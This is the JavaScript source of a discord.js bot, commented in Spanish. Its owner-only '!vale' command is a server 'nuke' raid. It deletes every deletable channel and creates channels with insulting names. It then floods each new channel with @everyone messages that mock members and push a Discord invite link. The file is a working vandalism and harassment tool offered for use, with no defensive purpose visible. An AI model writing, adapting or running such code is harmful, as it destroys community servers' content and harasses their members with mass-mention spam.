require('dotenv').config();

const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const chalk = require('chalk');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const PREFIX = '!';
const OWNER_IDS = ["1436516806842912970"]; // TU ID REAL aquí

client.once('ready', () => {
  console.log(chalk.green.bold(`Bot conectado como ${client.user.tag}`));
  console.log(chalk.yellow('Prefijo: ' + PREFIX));
  console.log(chalk.cyan('Comando !vale disponible solo para owners'));
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'vale') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('No tienes permiso para este comando tan heavy.');
    }

    const nombresDeCanales = [
      "raid-for-$pwm$-jajaja",
      "raid-for-$pwm$-jajaja",
      "raid-for-$pwm$-jajaja",
      "raid-for-$pwm$-jajaja",
      "you-are-idiot-owned-by-vale",
      "you-are-idiot-owned-by-vale",
    ];

    const mensajesEnRafaga = [
      "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
      "@everyone raid for $pwm$ JAJAJAJA you are idiot",
      "@everyone raid for $pwm$ JAJAJAJA you are idiot",
      "@everyone raid for $pwm$ JAJAJAJA you are idiot",
      "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
      "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
      "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
      "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
      "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
    ];

    const delayEntreMensajes = 1300;

    await message.reply(
      `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
      `→ Creando **${nombresDeCanales.length}** canales\n` +
      `→ Enviando **${mensajesEnRafaga.length}** mensajes por canal\n\n` +
      `¡Ctrl + C para cancelar!`
    ).catch(err => console.log('No se pudo responder inicio:', err.message));

    await new Promise(r => setTimeout(r, 5000));

    const guild = message.guild;

    try {
      // 1. Borrar canales
      let borrados = 0;
      for (const ch of guild.channels.cache.values()) {
        if (ch.deletable && ch.id !== message.channel.id) {
          try {
            await ch.delete('Nuke by !vale');
            borrados++;
            await new Promise(r => setTimeout(r, 300));
          } catch {}
        }
      }
      await message.channel.send(`→ Borrados **${borrados}** canales.`).catch(() => {});

      // 2. Crear canales
      const nuevosCanales = [];
      for (const nombreOriginal of nombresDeCanales) {
        try {
          let nombre = nombreOriginal
            .toLowerCase()
            .replace(/[^a-z0-9- ]/g, '-')     // solo a-z, 0-9, -, espacio
            .replace(/\s+/g, '-')             // espacios → -
            .replace(/-+/g, '-')              // evitar -----
            .replace(/^-|-$/g, '')            // quitar - inicial/final
            .slice(0, 100);

          if (!nombre) nombre = 'raid-default-' + Date.now().toString().slice(-6);

          const canal = await guild.channels.create({
            name: nombre,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
            ]
          });

          nuevosCanales.push(canal);
          console.log(chalk.green(`Creado → #${canal.name}`));
          await new Promise(r => setTimeout(r, 900));
        } catch (err) {
          console.log(chalk.red(`Fallo creando "${nombreOriginal}": ${err.message}`));
        }
      }

      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`).catch(() => {});

      // 3. Spam
      let spameados = 0;
      for (const canal of nuevosCanales) {
        try {
          for (const msg of mensajesEnRafaga) {
            await canal.send(msg);
            console.log(chalk.blue(`Enviado a #${canal.name}: ${msg.substring(0, 40)}...`));
            await new Promise(r => setTimeout(r, delayEntreMensajes));
          }
          spameados++;
        } catch (err) {
          console.log(chalk.yellow(`Problema en #${canal.name}: ${err.message}`));
        }
      }

      await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`).catch(() => {});

    } catch (err) {
      console.error(chalk.red.bold('Error grave en !vale:'), err.stack || err);
      await message.channel.send('Error grave. Revisa logs.').catch(() => {});
    }
  }

  if (command === 'help') {
    return message.reply('Comandos:\n!vale → nuke personalizado (solo owners)\n!help → este mensaje');
  }
});

client.login(process.env.TOKEN).catch(err => {
  console.error(chalk.red.bold('Error crítico al conectar:'), err.message || err);
});